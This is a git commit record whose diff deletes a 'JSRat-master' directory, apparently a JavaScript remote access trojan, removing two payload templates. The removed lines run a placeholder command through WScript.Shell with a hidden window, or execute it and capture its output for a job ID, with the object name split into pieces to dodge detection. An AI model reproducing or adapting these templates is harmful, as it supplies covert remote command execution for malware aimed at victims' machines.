d2a88854c8b6343795834fff0258b1d44b6ec884
21dddd <15779379408@163.com>
2025-02-21 10:17:09 +0800

    Delete JSRat-master directory

--- JSRat-master/template/run.js
+++
@@ -1,2 +0,0 @@
-r = new ActiveXObject("WScript.Shell").Run("~CMD~", 0, false);
-c = "~JOB_ID~" + "|" + "[run success]";
--- JSRat-master/template/shell.js
+++
@@ -1,6 +0,0 @@
-r = new ActiveXObject("WScrip" + "t.She" + "ll").Exec("~CMD~");
-a = "";
-while (!r.StdOut.AtEndOfStream) {
-    a = r.StdOut.ReadAll();
-}
-c = "~JOB_ID~" + "|" + a;
